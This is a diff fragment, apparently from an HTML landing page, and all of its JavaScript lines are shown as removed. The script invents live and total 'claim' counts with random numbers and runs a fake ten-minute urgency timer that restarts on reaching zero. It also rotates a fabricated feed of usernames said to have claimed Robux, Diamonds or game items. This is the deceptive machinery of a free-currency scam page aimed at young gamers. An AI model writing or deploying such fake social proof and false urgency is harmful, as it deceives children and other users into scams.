-      const todaySpan = document.getElementById('todayClaims');
-      const timerSpan = document.getElementById('urgencyTimer');
-      let secondsLeft = 600;
-
-      function updateLandingStats() {
-        if (liveSpan) {
-          let curr = parseInt(liveSpan.innerText.replace(/,/g, '')) || 18342;
-          curr = Math.max(12400, curr + Math.floor(Math.random() * 23) - 7);
-          liveSpan.innerText = curr.toLocaleString();
-        }
-        if (totalSpan) {
-          let total = parseInt(totalSpan.innerText.replace(/,/g, '')) || 4892103;
-          total += Math.floor(Math.random() * 45) + 12;
-          totalSpan.innerText = total.toLocaleString();
-        }
-        if (todaySpan) {
-          let today = parseInt(todaySpan.innerText.replace(/,/g, '')) || 9421;
-          today += Math.floor(Math.random() * 23) + 5;
-          todaySpan.innerText = today.toLocaleString();
-        }
-      }
-
-      function startUrgencyTimer() {
-        setInterval(() => {
-          if (secondsLeft <= 0) secondsLeft = 600;
-          else secondsLeft--;
-          const mins = Math.floor(secondsLeft / 60);
-          const secs = secondsLeft % 60;
-          if (timerSpan) timerSpan.innerText = `${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
-        }, 1000);
-      }
-
-      function rotateClaimFeed() {
-        const feed = document.getElementById('claimFeed');
-        if (!feed) return;
-        const messages = [
-          "✨ <strong>@RoxyBlox_07</strong> claimed 5,800 Robux",
-          "💎 <strong>@NinjaPro223</strong> claimed 700 Diamonds",
-          "🧠 <strong>@BrainRotLord</strong> stole Strawberry Elephant",
-          "🌊 <strong>@TsunamiPlayer</strong> escaped with Dragon Cannelloni",
-          "💰 <strong>@RobuxHunter</strong> unlocked 25,000 Robux",
-          "🔥 <strong>@BloxyChamp</strong> got 100,000 Robux!",
-          "⚡ <strong>@SkibidiRizz</strong> stole Meowl",
-          "🏆 <strong>@LegendaryVibes</strong> earned 7,000 Diamonds"
-        ];
-        setInterval(() => {
-          const randomMsg = messages[Math.floor(Math.random() * messages.length)];
-          const newSpan = document.createElement('span');
-          newSpan.innerHTML = randomMsg;
-          feed.appendChild(newSpan);
-          if (feed.children.length > 6) feed.removeChild(feed.children[0]);
-        }, 3800);
-      }
-
-      updateLandingStats();
-      setInterval(updateLandingStats, 5400);
-      startUrgencyTimer();
-      rotateClaimFeed();
-    })();
   </script>
 </body>
 </html>
-```
